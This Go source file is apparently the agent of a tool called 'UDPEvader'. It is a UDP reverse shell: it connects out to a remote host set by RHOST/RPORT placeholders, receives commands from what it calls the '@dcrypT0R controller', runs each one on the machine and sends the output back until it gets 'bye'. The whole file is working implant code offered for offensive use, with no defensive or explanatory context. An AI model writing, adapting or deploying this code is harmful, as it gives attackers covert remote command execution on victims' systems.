package main

import (
	"fmt"
	"strings"

	"UDPEvader/src/agentprops"
)

const BUFFSIZE = 1024

func main() {
	udpshellproperties := &agentprops.UDPShellProps{
		RemoteServer: "RHOST",
		UDPPort:      "RPORT",
	}

	udpconn, err := udpshellproperties.DialUpUDP()

	if err != nil {
		fmt.Println("UDP Error : ", err)
	}
	udpshellproperties.TargetUDPConn = udpconn
	defer udpshellproperties.TargetUDPConn.Close()

	recvdbuffer := make([]byte, BUFFSIZE)
	udpshellproperties.TargetUDPConn.Write([]byte("connected"))
	for {
		recvdbytes, _, err := udpshellproperties.TargetUDPConn.ReadFromUDP(recvdbuffer)
		if err != nil {
			fmt.Println("Error while reading from @dcrypT0R controller")
			return
		}
		cmdtorun := string(recvdbuffer[0:recvdbytes])
		cmdtorun = strings.TrimSpace(strings.ReplaceAll(cmdtorun, "\r\n", ""))
		fmt.Println((cmdtorun))
		if cmdtorun == "bye" {
			udpshellproperties.ResultToSend = []byte("Agent disconnected")
			udpshellproperties.SendResultToController()
			udpshellproperties.TargetUDPConn.Close()
			return
		} else {
			udpshellproperties.CommandToExecute = string(recvdbuffer[0:recvdbytes])
			udpshellproperties.ResultToSend = udpshellproperties.ExecCmd()
			//fmt.Println(string(res))
			udpshellproperties.SendResultToController()
		}

	}
}
